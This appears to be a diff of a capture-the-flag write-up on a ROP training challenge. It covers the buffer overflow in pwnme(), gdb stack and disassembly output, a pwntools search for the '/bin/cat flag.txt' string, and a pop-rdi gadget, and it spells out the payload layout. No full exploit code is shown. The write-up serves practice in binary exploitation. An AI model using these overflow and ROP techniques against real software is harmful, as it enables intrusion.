@@ -52,7 +52,7 @@ In the description of the challenge, we're told there is a "/bin/cat flag.txt" s
   
 The read() function in pwnme() is expecting 96 bytes even tho the local_28 variable is 32 bytes long. This i vulnerable to a buffer overflow.  
   
-Let's exploit this to run the system call in usefulFunction() with the "/bin/cat flag.txt" string as parameter.
+Let's exploit this to run the system call in usefulFunction() with the `/bin/cat flag.txt` string as parameter.
 
 # Dynamic analysis
 
@@ -65,7 +65,7 @@ gef➤  r <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*32)')
 ```
 
 ```gdb
-─────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
 0x00007fffffffda30│+0x0000: 0x4141414141414141	 ← $rsp, $rsi
 0x00007fffffffda38│+0x0008: 0x4141414141414141
 0x00007fffffffda40│+0x0010: 0x4141414141414141
@@ -74,11 +74,21 @@ gef➤  r <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*32)')
 0x00007fffffffda58│+0x0028: 0x00000000004006d7  →  <main+0040> mov edi, 0x400806
 0x00007fffffffda60│+0x0030: 0x0000000000000001
 0x00007fffffffda68│+0x0038: 0x00007ffff7df16ca  →  <__libc_start_call_main+007a> mov edi, eax
+──────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+     0x400728 <pwnme+0040>     mov    rsi, rax
+     0x40072b <pwnme+0043>     mov    edi, 0x0
+     0x400730 <pwnme+0048>     call   0x400590 <read@plt>
+ →   0x400735 <pwnme+004d>     mov    edi, 0x40083f
+     0x40073a <pwnme+0052>     call   0x400550 <puts@plt>
+     0x40073f <pwnme+0057>     nop    
+     0x400740 <pwnme+0058>     leave  
+     0x400741 <pwnme+0059>     ret    
+     0x400742 <usefulFunction+0000> push   rbp
 ```
 
 We can see that the rbp is stored right after the variable : our payload will have an offset of 32 bytes.  
   
-Let's find the "/bin/cat flag.txt" string using pwntool :
+Let's find the `/bin/cat flag.txt` string using pwntool :
 
 ```python
 from pwn import *
@@ -120,7 +130,7 @@ gef➤  x/2wi 0x00000000004007c3
    0x4007c4 <__libc_csu_init+100>:	ret
 ```
 
-We got all we need, let's write an exploit.
+We got all we need, our payload will be : an offset to reach the return address, the gadget to modify rdi followed by the pointer to the string to be put inside rdi, and finally the pointer to the system call.
 
 # Exploit
 
